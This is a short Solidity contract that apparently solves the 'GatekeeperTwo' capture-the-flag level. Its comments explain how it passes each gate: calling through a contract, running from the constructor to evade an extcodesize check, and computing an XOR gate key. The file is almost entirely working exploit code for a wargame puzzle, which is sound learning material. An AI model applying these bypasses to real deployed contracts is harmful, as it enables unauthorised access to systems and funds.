// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface GatekeeperTwoInterface {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract UnlockTwo {
    GatekeeperTwoInterface gatekeeper;
    
    constructor(address _gatekeeperTwo, uint _gas) {
        /*Calling the function through this contract already passes Gate 1 as 
          tx.origin != msg.sender
        */

        /* Gate 2 requires the caller to have a contract size of zero.
           The extcodesize returns the size of the code in the given address, 
           which is caller for this case. 
           Contracts have code, and user accounts do not. 
           To have 0 code size, you must be an account.
           A way to bypass this will be to run all the code in the constructor
          of this contract. This way, when it is checked it does not have size yet.
         */

        /*
           Gate 3 key: The address of the contract XOR with key = -1.
          uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) = -1
          So we make it be the missing part for the XOR to work
        */
        gatekeeper = GatekeeperTwoInterface(_gatekeeperTwo);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gatekeeper.enter{gas:_gas}(key);
    }
}